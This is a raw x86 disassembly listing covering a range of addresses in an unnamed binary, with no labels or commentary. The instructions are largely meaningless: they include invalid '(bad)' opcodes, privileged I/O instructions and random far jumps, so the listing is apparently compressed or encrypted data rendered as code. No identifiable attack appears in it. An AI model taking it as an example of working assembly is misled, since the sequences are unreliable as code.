  41b624:	ror    DWORD PTR [edx-0x17],1
  41b627:	icebp  
  41b628:	in     al,0x91
  41b62a:	into   
  41b62b:	pop    esp
  41b62c:	fcom   DWORD PTR ds:0x28573395
  41b632:	test   BYTE PTR [edi+0xa935a1c],dh
  41b638:	pop    eax
  41b639:	lahf   
  41b63a:	dec    ebp
  41b63b:	arpl   WORD PTR [edx-0x61],bp
  41b63e:	(bad)  
  41b63f:	fidiv  DWORD PTR [ebx]
  41b641:	mov    bl,0x96
  41b643:	hlt    
  41b644:	inc    ecx
  41b645:	mov    al,0x80
  41b647:	rol    eax,cl
  41b649:	jae    0x41b6c3
  41b64b:	fstp   st(4)
  41b64d:	mov    dh,BYTE PTR gs:[edi+0x24]
  41b651:	jae    0x41b60d
  41b653:	fist   WORD PTR [ebx-0x51]
  41b656:	push   eax
  41b657:	inc    edx
  41b658:	or     DWORD PTR [ebp+0x7a3ee603],eax
  41b65e:	jecxz  0x41b61e
  41b660:	lods   al,BYTE PTR ds:[esi]
  41b661:	mov    edx,0x38f23213
  41b666:	mov    BYTE PTR [esi-0x3f],bl
  41b669:	enter  0x70fd,0x76
  41b66d:	fstp   TBYTE PTR [ecx+0x1d]
  41b670:	adc    BYTE PTR [edx],0x89
  41b673:	xor    al,bh
  41b675:	mov    esp,0x845e8a3
  41b67a:	jg     0x41b6ba
  41b67c:	and    al,0xdb
  41b67e:	aam    0x80
  41b680:	lods   eax,DWORD PTR ds:[esi]
  41b681:	push   ebp
  41b682:	pop    es
  41b683:	das    
  41b684:	fsub   st(7),st
  41b686:	mov    bh,0xa3
  41b688:	cmp    BYTE PTR [edi-0x76],dh
  41b68b:	ror    bh,1
  41b68d:	mov    al,ds:0x6057
	...
  41b6f2:	add    BYTE PTR [eax],al
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	fstp   DWORD PTR [eax+0x231cf034]
  41b706:	add    DWORD PTR [eax],eax
  41b708:	add    al,0x1
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	add    ecx,DWORD PTR [ecx-0x104d8292]
  41b712:	idiv   BYTE PTR ds:0x937b4705
  41b718:	fbstp  TBYTE PTR [edi-0xc78c05e]
  41b71e:	dec    esi
  41b71f:	mov    edx,0xaff5eb07
  41b724:	nop
  41b725:	dec    esi
  41b726:	sub    dl,BYTE PTR [ebp+edi*8+0x9]
  41b72a:	cmp    BYTE PTR [ebx],0x8
  41b72d:	ins    DWORD PTR es:[edi],dx
  41b72e:	xchg   edx,eax
  41b72f:	jnp    0x41b769
  41b731:	mov    esi,0x925c4698
  41b736:	mov    cs,WORD PTR [ecx+0x3]
  41b739:	inc    esp
  41b73a:	push   ebp
  41b73b:	imul   edx,DWORD PTR [ecx+0x183795d5],0xffffff92
  41b742:	dec    esi
  41b743:	jp     0x41b7c4
  41b745:	pushf  
  41b746:	shr    BYTE PTR [ebp-0x31],cl
  41b749:	in     eax,dx
  41b74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b74b:	mov    al,0x8
  41b74d:	and    bl,BYTE PTR [eax]
  41b74f:	nop
  41b750:	jg     0x41b738
  41b752:	mov    esp,0xf839b135
  41b757:	push   esi
  41b758:	inc    ecx
  41b759:	fsubp  st(2),st
  41b75b:	dec    eax
  41b75c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41b75e:	mov    ds:0x50229100,eax
  41b763:	jns    0x41b78a
  41b765:	and    ebp,0xe3b7ea2d
  41b76b:	mov    ecx,0x16db8112
  41b770:	sar    BYTE PTR ds:0x7162d853,0xbb
  41b777:	mov    ebp,0x86f30dfe
  41b77c:	push   es
  41b77d:	scas   al,BYTE PTR es:[edi]
  41b77e:	jg     0x41b7b9
  41b780:	xchg   ecx,esp
  41b782:	icebp  
  41b783:	xor    DWORD PTR [ebp-0x3e],edi
  41b786:	mov    edi,0xdcdccc55
  41b78b:	pop    eax
  41b78c:	xor    eax,0x298df223
  41b791:	and    eax,esi
  41b793:	or     ebp,ebp
  41b795:	int    0x78
  41b797:	das    
  41b798:	mov    dl,0x7a
  41b79a:	bound  ebx,QWORD PTR [edx]
  41b79c:	mov    ah,0x23
  41b79e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b79f:	or     ebx,DWORD PTR [ebx-0x782ef461]
  41b7a5:	clc    
  41b7a6:	sti    
  41b7a7:	pushf  
  41b7a8:	and    BYTE PTR [ecx+0x1881b991],bh
  41b7ae:	js     0x41b7db
  41b7b0:	in     al,dx
  41b7b1:	hlt    
  41b7b2:	add    al,0x76
  41b7b4:	jne    0x41b7c5
  41b7b6:	mov    WORD PTR [ecx+eiz*2],ds
  41b7b9:	dec    ebx
  41b7ba:	outs   dx,BYTE PTR ds:[esi]
  41b7bb:	(bad)  
  41b7bc:	(bad)  
  41b7bd:	out    dx,eax
  41b7be:	add    BYTE PTR [edx-0x57],0x4a
  41b7c2:	xor    DWORD PTR [ebx+ecx*8],edi
  41b7c5:	pop    es
  41b7c6:	push   ds
  41b7c7:	xchg   ebx,eax
  41b7c8:	aas    
  41b7c9:	jno    0x41b7da
  41b7cb:	mov    ah,0xa7
  41b7cd:	cmp    DWORD PTR cs:[esi-0x65],esi
  41b7d1:	daa    
  41b7d2:	dec    ebx
  41b7d3:	ror    DWORD PTR [ebx],1
  41b7d5:	stos   DWORD PTR es:[edi],eax
  41b7d6:	push   edx
  41b7d7:	mov    ebp,0xca123016
  41b7dc:	xor    BYTE PTR [edi+0x18766457],cl
  41b7e2:	lahf   
  41b7e3:	add    bh,0xfd
  41b7e6:	int3   
  41b7e7:	push   esi
  41b7e8:	aad    0x58
  41b7ea:	jg     0x41b839
  41b7ec:	int    0x64
  41b7ee:	jg     0x41b7e7
  41b7f0:	dec    esi
  41b7f1:	iret   
  41b7f2:	mov    ebp,0x35f3766
  41b7f7:	jle    0x41b86f
  41b7f9:	in     al,dx
  41b7fa:	dec    esi
  41b7fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7fc:	(bad)  
  41b7fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7fe:	jae    0x41b7aa
  41b800:	aas    
  41b801:	imul   ebx,DWORD PTR [edx+0x315bcb0],0xdf1a320b
  41b80b:	les    ebx,FWORD PTR [esi+edx*4+0x4945]
	...
  41b872:	add    BYTE PTR [eax],al
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x68
  41b881:	push   esi
  41b882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b883:	xor    al,0x20
  41b885:	and    al,0x1
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	mov    al,ds:0x9d866ee5
  41b891:	mov    al,0xf9
  41b893:	stc    
  41b894:	lods   eax,DWORD PTR ds:[esi]
  41b895:	push   ss
  41b896:	rcr    BYTE PTR [edi+edi*4-0x1ae0f15e],1
  41b89d:	adc    eax,edi
  41b89f:	sub    BYTE PTR [esi],dh
  41b8a1:	jo     0x41b855
  41b8a3:	dec    ebp
  41b8a4:	shl    BYTE PTR [ebp+0x65],1
  41b8a7:	mov    ds:0x35c14250,eax
  41b8ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8ad:	adc    al,0x9
  41b8af:	sbb    eax,0x83b52089
  41b8b4:	(bad)  
  41b8b6:	(bad)  [ebp-0x221e648c]
  41b8bc:	jae    0x41b86d
  41b8be:	cmp    bh,bh
  41b8c0:	mov    ah,0xe6
  41b8c2:	jle    0x41b8c8
  41b8c4:	mov    ecx,0x36ca645c
  41b8c9:	fiadd  DWORD PTR [esi+0x1d5345d4]
  41b8cf:	jbe    0x41b886
  41b8d1:	jnp    0x41b874
  41b8d3:	loopne 0x41b8d9
  41b8d5:	push   ebx
  41b8d6:	mov    al,ch
  41b8d8:	mov    eax,0xfd2d557
  41b8dd:	shl    BYTE PTR [edi],1
  41b8df:	daa    
  41b8e0:	jno    0x41b924
  41b8e2:	jmp    0x41b93c
  41b8e4:	fst    QWORD PTR [edi]
  41b8e6:	shr    BYTE PTR [ebp+0xe],cl
  41b8e9:	neg    al
  41b8eb:	fs xor al,0xb2
  41b8ee:	mov    esi,0xf5aee32
  41b8f3:	aas    
  41b8f4:	xchg   edi,eax
  41b8f5:	mov    bl,0xa1
  41b8f7:	mov    al,ds:0xd7fa227d
  41b8fc:	mov    ah,0x29
  41b8fe:	push   ecx
  41b8ff:	imul   ebx,ecx,0x1d479376
  41b905:	mov    ds:0x4e4a70e1,eax
  41b90a:	push   ecx
  41b90b:	mov    edi,DWORD PTR [eax+0x77]
  41b90e:	push   DWORD PTR ds:0x103eb3a6
  41b914:	dec    esp
  41b915:	adc    al,al
  41b917:	test   al,0xb7
  41b919:	xor    ebx,eax
  41b91b:	push   edi
  41b91c:	push   0xffffff9d
  41b91e:	mov    esp,0x70bf120d
  41b923:	shl    eax,0x3
  41b926:	mov    ds:0x7b69e37c,al
  41b92b:	aas    
  41b92c:	ss inc ebx
  41b92e:	mov    edx,DWORD PTR [ecx-0x6e]
  41b931:	mov    esi,0x70cd2d03
  41b936:	sar    DWORD PTR [edx+0x406bb4cf],cl
  41b93c:	jb     0x41b9ba
  41b93e:	call   0x4a2f:0x1aaefdd3
  41b945:	xor    esi,DWORD PTR [eax-0x7c5a7853]
  41b94b:	int3   
  41b94c:	push   ecx
  41b94d:	int    0x32
  41b94f:	cld    
  41b950:	mov    esp,0xc8b20966
  41b955:	test   eax,0x2165593d
  41b95a:	cmp    ch,BYTE PTR [ebp-0x23]
  41b95d:	push   cs
  41b95e:	adc    al,0xc
  41b960:	sbb    al,0x8e
  41b962:	mov    al,ds:0x1c71119
  41b967:	sub    al,BYTE PTR [edi+0x4f4a3d61]
  41b96d:	inc    eax
  41b96e:	pop    edi
  41b96f:	add    DWORD PTR [esi-0x64],0x1f7cd9be
  41b976:	popa   
  41b977:	mov    ds:0xe02b9daa,eax
  41b97c:	cdq    
  41b97d:	push   ebx
  41b97e:	xor    DWORD PTR [edi+0x1e2edbcd],eax
  41b984:	sub    edx,DWORD PTR [ebx+0x33b5fd78]
  41b98a:	fiadd  DWORD PTR [edi+0x261fc768]
	...
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	lods   eax,DWORD PTR ds:[esi]
  41ba01:	std    
  41ba02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba03:	xor    al,0x24
  41ba05:	and    eax,0x1040001
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	xchg   DWORD PTR [ecx],ebx
  41ba0e:	fsubr  st(5),st
  41ba10:	dec    esp
  41ba11:	cmp    ch,ah
  41ba13:	dec    eax
  41ba14:	aad    0x95
  41ba16:	cmp    eax,0x639c20aa
  41ba1b:	sub    BYTE PTR [edx],0x1c
  41ba1e:	push   eax
  41ba1f:	hlt    
  41ba20:	je     0x41ba1a
  41ba22:	pop    esp
  41ba23:	enter  0x9d66,0xb1
  41ba27:	ins    BYTE PTR es:[edi],dx
  41ba28:	jle    0x41ba06
  41ba2a:	pop    ds
  41ba2b:	jle    0x41ba07
  41ba2d:	pop    ebx
  41ba2e:	sbb    DWORD PTR [edi+0xaf64d9],esi
  41ba34:	lds    ebp,FWORD PTR [ebx]
  41ba36:	jne    0x41ba5a
  41ba38:	(bad)  
  41ba39:	push   esi
  41ba3a:	gs adc al,0x49
  41ba3d:	int    0xa4
  41ba3f:	fs test DWORD PTR ss:[edx],0x21838293
  41ba47:	mov    esp,0x7ac7d9aa
  41ba4c:	leave  
  41ba4d:	xor    bl,ch
  41ba4f:	fs out 0xb4,eax
  41ba52:	xchg   ebp,eax
  41ba53:	fwait
  41ba54:	sub    DWORD PTR [edi+eiz*1-0x4f],edx
  41ba58:	push   esp
  41ba59:	mov    bl,0xeb
  41ba5b:	xor    al,al
  41ba5d:	dec    esi
  41ba5e:	add    DWORD PTR [ecx+eax*2-0x3a63ae42],eax
  41ba65:	loop   0x41baac
  41ba67:	add    BYTE PTR [edi+0x26a5d91b],ch
  41ba6d:	aam    0x49
  41ba6f:	jae    0x41ba39
  41ba71:	and    al,0xd3
  41ba73:	inc    esp
  41ba74:	ret    
  41ba75:	push   ss
  41ba76:	rol    DWORD PTR [ecx],cl
  41ba78:	(bad)  
  41ba79:	hlt    
  41ba7a:	outs   dx,DWORD PTR ds:[esi]
  41ba7b:	pop    esi
  41ba7c:	jmp    0x63ff:0x6a6c8336
  41ba83:	mov    ch,dl
  41ba85:	cmp    eax,0x764b6f56
  41ba8a:	fs cmp al,0xc
  41ba8d:	fs cli 
  41ba8f:	xor    ah,BYTE PTR [edi]
  41ba91:	mov    cl,BYTE PTR [esi]
  41ba93:	scas   eax,DWORD PTR es:[edi]
  41ba94:	xor    DWORD PTR [edi+eiz*2],ebx
  41ba97:	inc    edi
  41ba98:	mov    esi,0x808ddd05
  41ba9d:	xchg   edi,eax
  41ba9e:	dec    ebx
  41ba9f:	xchg   edi,eax
  41baa0:	or     eax,0x80ae0c56
  41baa5:	xchg   ecx,eax
  41baa6:	jns    0x41bb15
  41baa8:	jae    0x41baf7
  41baaa:	pop    esi
  41baab:	enter  0x1751,0xe6
  41baaf:	adc    eax,0x874bb01e
  41bab4:	int    0x7f
  41bab6:	jle    0x41ba67
  41bab8:	das    
  41bab9:	mov    al,0x3c
  41babb:	(bad)  
  41babc:	(bad)  
  41babd:	sub    eax,0xf722eb22
  41bac2:	rcr    edx,cl
  41bac4:	repz mov esp,0xdd0791be
  41baca:	into   
  41bacb:	pop    ds
  41bacc:	clc    
  41bacd:	pop    edx
  41bace:	cmp    DWORD PTR [edi],0xf7814c03
  41bad4:	dec    esi
  41bad5:	fidivr DWORD PTR [ebx+0x17]
  41bad8:	push   esp
  41bad9:	gs aas 
  41badb:	cld    
  41badc:	pop    edi
  41badd:	out    0xca,eax
  41badf:	and    DWORD PTR [ecx],ebp
  41bae1:	fnstenv [edx-0x50]
  41bae4:	xchg   esi,eax
  41bae5:	inc    ebp
  41bae6:	xor    dl,BYTE PTR [eax]
  41bae8:	jecxz  0x41baaf
  41baea:	adc    BYTE PTR [edx-0x3c525ffa],ah
  41baf0:	dec    esi
  41baf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baf2:	sbb    esi,ebx
  41baf4:	ds push cs
  41baf6:	pop    ss
  41baf7:	jae    0x41bad9
  41baf9:	shl    DWORD PTR [edi+0x1ea1f2d9],cl
  41baff:	push   cs
  41bb00:	das    
  41bb01:	les    ebx,FWORD PTR [edi-0x4d98d5d6]
  41bb07:	ss push cs
  41bb09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb0a:	cmp    eax,0x6ed8ece8
  41bb0f:	hlt    
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x57],cx
  41bb81:	or     al,0x1b
  41bb83:	out    0x28,al
  41bb85:	add    DWORD PTR es:[eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	xor    DWORD PTR ds:0x391ca81b,esp
  41bb92:	cmp    al,0xa5
  41bb94:	ds pop ecx
  41bb96:	mov    ecx,0xe6ae0929
  41bb9b:	push   esp
  41bb9c:	and    al,0x27
  41bb9e:	iret   
  41bb9f:	mov    gs,WORD PTR [ebx-0xfb04121]
  41bba5:	sbb    edi,DWORD PTR [eax]
  41bba7:	push   ebx
  41bba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bba9:	add    eax,0xeaa0a8b1
  41bbae:	repz les esp,FWORD PTR [ebx]
  41bbb1:	dec    ebp
  41bbb2:	popa   
  41bbb3:	stos   BYTE PTR es:[edi],al
  41bbb4:	in     al,0x98
  41bbb6:	dec    ecx
  41bbb7:	push   edx
  41bbb8:	push   cs
  41bbb9:	mov    ebp,0x2e450f82
  41bbbe:	jmp    0x4340:0x59363b43
  41bbc5:	cmc    
  41bbc6:	repnz mov BYTE PTR [esi],cl
  41bbc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbca:	xor    al,BYTE PTR ds:0x652bd5b4
  41bbd0:	xchg   esi,eax
  41bbd1:	outs   dx,DWORD PTR ds:[esi]
  41bbd2:	cmp    ah,cl
  41bbd4:	fnsave [ebp+0x69]
  41bbd7:	je     0x41bbb2
  41bbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbda:	mov    ds:0x637e3751,eax
  41bbdf:	loopne 0x41bc3a
  41bbe1:	add    esp,DWORD PTR [ebx+esi*4+0x49]
  41bbe5:	(bad)  
  41bbe7:	mov    BYTE PTR [edi+esi*1],bl
  41bbea:	cmp    ebp,ecx
  41bbec:	loopne 0x41bbc6
  41bbee:	mov    ecx,0x7b3b58c3
  41bbf3:	jmp    0xa8a4e7c9
  41bbf8:	mov    edi,0x13813e04
  41bbfd:	or     eax,0xb59cfda6
  41bc02:	jge    0x41bc68
  41bc04:	retf   
  41bc05:	xor    eax,0xe277b924
  41bc0a:	je     0x41bb94
  41bc0c:	shl    BYTE PTR ds:0x6b409c96,0xd0
  41bc13:	dec    edi
  41bc14:	sbb    DWORD PTR ds:0x489b9941,0x7d48b6b6
  41bc1e:	(bad)  
  41bc1f:	icebp  
  41bc20:	pop    edi
  41bc21:	push   0x20
  41bc23:	dec    edi
  41bc24:	jecxz  0x41bc56
  41bc26:	aad    0x73
  41bc28:	jp     0x41bc73
  41bc2a:	(bad)  [ecx+ebp*4]
  41bc2d:	mov    esp,0x212ca037
  41bc32:	push   edx
  41bc33:	xor    al,0x2d
  41bc35:	mov    ah,0xda
  41bc37:	or     dl,dh
  41bc39:	les    esi,FWORD PTR [eax-0x405aa271]
  41bc3f:	mov    edi,DWORD PTR [edx]
  41bc41:	out    dx,al
  41bc42:	fdivr  st,st(4)
  41bc44:	jns    0x41bc8b
  41bc46:	xchg   ebx,eax
  41bc47:	call   0x97fc:0xf4db5830
  41bc4e:	push   0x674fba29
  41bc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc54:	mov    dl,0x7f
  41bc56:	fdivr  st,st(6)
  41bc58:	into   
  41bc59:	inc    edx
  41bc5a:	lea    esp,[edi-0x51]
  41bc5d:	aaa    
  41bc5e:	lds    edx,FWORD PTR [esi+0x68]
  41bc61:	mov    gs,eax
  41bc63:	out    dx,al
  41bc64:	into   
  41bc65:	fisttp QWORD PTR [eax+ebx*2]
  41bc68:	sub    al,0x95
  41bc6a:	fild   QWORD PTR [ecx+0x18]
  41bc6d:	mov    ebx,0x5bfc5d3b
  41bc72:	jae    0x41bbfa
  41bc74:	push   ebx
  41bc75:	stos   BYTE PTR es:[edi],al
  41bc76:	and    al,0x27
  41bc78:	fsub   DWORD PTR [ecx-0x1567d470]
  41bc7e:	sti    
  41bc7f:	hlt    
  41bc80:	fisubr DWORD PTR ds:0xabef9807
  41bc86:	in     al,dx
  41bc87:	cdq    
  41bc88:	mov    ?,WORD PTR [esi-0x79]
  41bc8b:	loope  0x41bc11
  41bc8d:	ja     0x41bc7f
  41bc8f:	test   DWORD PTR [eax],0x0
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x4e3ed9d8
  41bd02:	ret    0x2cdc
  41bd05:	daa    
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	pop    esi
  41bd0d:	ret    0xf629
  41bd10:	jne    0x41bd5e
  41bd12:	mov    ah,0x8
  41bd14:	mov    bh,0xc1
  41bd16:	loop   0x41bcc6
  41bd18:	mov    BYTE PTR ds:0x62a8142e,cl
  41bd1e:	ret    0x7eb1
  41bd21:	jecxz  0x41bd44
  41bd23:	sub    BYTE PTR [ebp-0x5ace5caa],0x88
  41bd2a:	mov    ebx,0xb5fbd244
  41bd2f:	arpl   WORD PTR [edx+0x367ae397],di
  41bd35:	aam    0x8d
  41bd37:	cmp    al,0xe3
  41bd39:	hlt    
  41bd3a:	xor    ch,cl
  41bd3c:	sub    dh,BYTE PTR [ebx-0x79]
  41bd3f:	inc    esp
  41bd40:	and    DWORD PTR [edi+esi*2],esp
  41bd43:	fst    DWORD PTR [ebx-0x5b168467]
  41bd49:	push   0x21
  41bd4b:	add    DWORD PTR [ebx+0x6d],ebx
  41bd4e:	xchg   ecx,eax
  41bd4f:	mov    fs,WORD PTR [edx+0x59]
  41bd52:	add    DWORD PTR [ecx],0x96f548ad
  41bd58:	mov    edi,0x5c7ac249
  41bd5d:	sub    BYTE PTR [esi],ch
  41bd5f:	inc    ebp
  41bd60:	pop    esp
  41bd61:	sbb    al,0x15
  41bd63:	push   edi
  41bd64:	pusha  
  41bd65:	lods   al,BYTE PTR ds:[esi]
  41bd66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd67:	push   ebx
  41bd68:	dec    eax
  41bd69:	lock (bad) 
  41bd6b:	jge    0x41bd68
  41bd6d:	pop    ss
  41bd6e:	repnz hlt 
  41bd70:	rep lods eax,DWORD PTR ds:[esi]
  41bd72:	jmp    0xaaea:0x62e4e0a9
  41bd79:	push   ds
  41bd7a:	jmp    0x7c6873a4
  41bd7f:	retf   
  41bd80:	inc    ebx
  41bd81:	arpl   WORD PTR ds:0x99db92c5,sp
  41bd87:	retf   0xba79
  41bd8a:	add    BYTE PTR [ebp+0x3e],bh
  41bd8d:	pop    ecx
  41bd8e:	adc    eax,0xf16e31f4
  41bd93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd94:	jg     0x41bdf0
  41bd96:	mov    edx,0xa9f59854
  41bd9b:	repz sub bh,dh
  41bd9e:	imul   edi,esi,0x2834132d
  41bda4:	aam    0xae
  41bda6:	inc    esi
  41bda7:	adc    eax,0x8f1981e6
  41bdac:	jno    0x41be05
  41bdae:	or     ecx,DWORD PTR [ebx+0x4b]
  41bdb1:	inc    edx
  41bdb2:	adc    DWORD PTR [ebp+0x1a140700],ebp
  41bdb8:	loope  0x41be13
  41bdba:	shl    BYTE PTR [edx+0x2b],0x6d
  41bdbe:	push   cs
  41bdbf:	dec    ebx
  41bdc0:	jmp    0x41bd5f
  41bdc2:	clc    
  41bdc3:	inc    edi
  41bdc4:	neg    BYTE PTR [edx-0x55cc9232]
  41bdca:	jne    0x41bd94
  41bdcc:	jmp    0x65f2d874
  41bdd1:	lock and esi,DWORD PTR [edx+0x1]
  41bdd5:	jo     0x41bd5b
  41bdd7:	inc    ebp
  41bdd8:	and    dh,ah
  41bdda:	push   ebp
  41bddb:	cmc    
  41bddc:	pop    eax
  41bddd:	aad    0xb6
  41bddf:	and    dl,BYTE PTR [ebx-0x19]
  41bde2:	stos   BYTE PTR es:[edi],al
  41bde3:	sub    al,0x13
  41bde5:	add    DWORD PTR [eax-0x7c],ebp
  41bde8:	mov    cl,0xbd
  41bdea:	or     dh,BYTE PTR [ecx-0x1f3eeaf0]
  41bdf0:	push   esi
  41bdf1:	pop    edi
  41bdf2:	fcomip st,st(6)
  41bdf4:	lahf   
  41bdf5:	hlt    
  41bdf6:	cmp    dh,BYTE PTR [eax]
  41bdf8:	enter  0x6be8,0xd8
  41bdfc:	or     BYTE PTR [esi],0xbd
  41bdff:	sbb    BYTE PTR [esi-0x41],bh
  41be02:	cmp    ah,BYTE PTR [edx+0x3a]
  41be05:	or     bh,BYTE PTR [esi]
  41be07:	fadd   st(0),st
  41be09:	sub    ch,BYTE PTR [eax]
  41be0b:	(bad)  
  41be0c:	out    dx,eax
  41be0d:	pop    ebx
  41be0e:	adc    BYTE PTR [edi+0x0],bh
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0x2249c09a]
  41be82:	hlt    
  41be83:	aaa    
  41be84:	xor    BYTE PTR [eax],ch
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    al,0x1
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	rol    DWORD PTR [edx+0x256e300d],cl
  41be92:	imul   eax,DWORD PTR [esi+0x32],0x34
  41be96:	mov    BYTE PTR [ecx-0xba96acc],bh
  41be9c:	and    al,0xf6
  41be9e:	push   esi
  41be9f:	xor    bh,BYTE PTR [ecx]
  41bea1:	(bad)  
  41bea2:	pop    edx
  41bea3:	xchg   edx,eax
  41bea4:	(bad)  
  41bea5:	fdivp  st(7),st
  41bea7:	push   ecx
  41bea8:	sub    al,0x1d
  41beaa:	(bad)  
  41beab:	xor    dl,BYTE PTR [ebp+edx*1-0x2e]
  41beaf:	into   
  41beb0:	sahf   
  41beb1:	mov    ch,BYTE PTR [esi-0x8]
  41beb4:	sub    al,0x7f
  41beb6:	mov    ds:0xc91942a,al
  41bebb:	inc    eax
  41bebc:	lods   al,BYTE PTR ds:[esi]
  41bebd:	jecxz  0x41bf37
  41bebf:	mov    esi,0xdf55e7c
  41bec4:	pop    ebx
  41bec5:	sahf   
  41bec6:	xchg   DWORD PTR [edx+0x1ee586cc],esi
  41becc:	or     eax,esi
  41bece:	sub    ebx,ebx
  41bed0:	mov    bh,0x43
  41bed2:	inc    esp
  41bed3:	add    al,0x85
  41bed5:	add    edx,ebx
  41bed7:	mov    cl,0x5c
  41bed9:	mov    esi,esp
  41bedb:	pop    eax
  41bedc:	scas   al,BYTE PTR es:[edi]
  41bedd:	mov    ah,0xeb
  41bedf:	fwait
  41bee0:	xlat   BYTE PTR ds:[ebx]
  41bee1:	push   ebp
  41bee2:	inc    eax
  41bee3:	lea    ebp,[edx+0x16]
  41bee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bee7:	lods   al,BYTE PTR ds:[esi]
  41bee8:	add    eax,0x8a3a3114
  41beed:	ret    
  41beee:	test   BYTE PTR [edi-0x5b9ad97],0xda
  41bef5:	fist   DWORD PTR [edi+ebx*2-0x59]
  41bef9:	jge    0x41bf14
  41befb:	dec    edi
  41befc:	mov    BYTE PTR [edi],cl
  41befe:	outs   dx,BYTE PTR ds:[esi]
  41beff:	pop    ebx
  41bf00:	mov    cl,0xe
  41bf02:	je     0x41bef6
  41bf04:	or     edi,DWORD PTR [eax-0x35]
  41bf07:	push   ebp
  41bf08:	ret    0xce04
  41bf0b:	loop   0x41bf4d
  41bf0d:	retf   0xf31a
  41bf10:	gs push esp
  41bf12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf13:	loop   0x41bf71
  41bf15:	mov    eax,ds:0xa085695d
  41bf1a:	or     DWORD PTR [ebp-0xd],eax
  41bf1d:	fwait
  41bf1e:	push   ss
  41bf1f:	lods   eax,DWORD PTR ds:[esi]
  41bf20:	(bad)  
  41bf21:	icebp  
  41bf22:	das    
  41bf23:	dec    eax
  41bf24:	cmp    ebp,edi
  41bf26:	jp     0x41bf90
  41bf28:	xchg   DWORD PTR [ecx-0x39],esp
  41bf2b:	test   eax,0x832d8f89
  41bf30:	sbb    edi,DWORD PTR [esi]
  41bf32:	jl     0x41bf49
  41bf34:	ja     0x41bf14
  41bf36:	add    eax,0xb572e63a
  41bf3b:	in     eax,0xd
  41bf3d:	in     al,0xaa
  41bf3f:	es call 0xa416:0xef3c5763
  41bf47:	fstp   st(3)
  41bf49:	and    BYTE PTR [eax+0x147700b1],bh
  41bf4f:	loopne 0x41bf67
  41bf51:	mov    bl,0x3c
  41bf53:	fbld   TBYTE PTR [edx+0x3a]
  41bf56:	push   eax
  41bf57:	jae    0x41bfa6
  41bf59:	and    eax,0xf54a03da
  41bf5e:	push   0x5c
  41bf60:	jbe    0x41bf39
  41bf62:	or     BYTE PTR [ecx-0x2ab2f61],ch
  41bf68:	cwde   
  41bf69:	out    0xac,al
  41bf6b:	mov    dh,0x91
  41bf6d:	jae    0x41bf78
  41bf6f:	push   ds
  41bf70:	adc    al,0xca
  41bf72:	cs or  eax,ebx
  41bf75:	sub    BYTE PTR [ecx+eax*2+0x26],bl
  41bf79:	add    esi,DWORD PTR [ebx]
  41bf7b:	pop    ecx
  41bf7c:	jp     0x41bfe4
  41bf7e:	imul   eax,ecx,0xd37e072
  41bf84:	daa    
  41bf85:	loop   0x41bf77
  41bf87:	mov    esi,0x4c7b9ab7
  41bf8c:	and    DWORD PTR [eax+edx*8+0xb],ebx
	...
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	enter  0x77b1,0xea
  41c004:	xor    al,0x29
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	jmp    0x41bf9d
  41c00e:	pop    ecx
  41c00f:	inc    ebp
  41c010:	or     eax,eax
  41c012:	mov    eax,ds:0xe69b875f
  41c017:	std    
  41c018:	cmp    BYTE PTR [esi+0x17a5fce4],cl
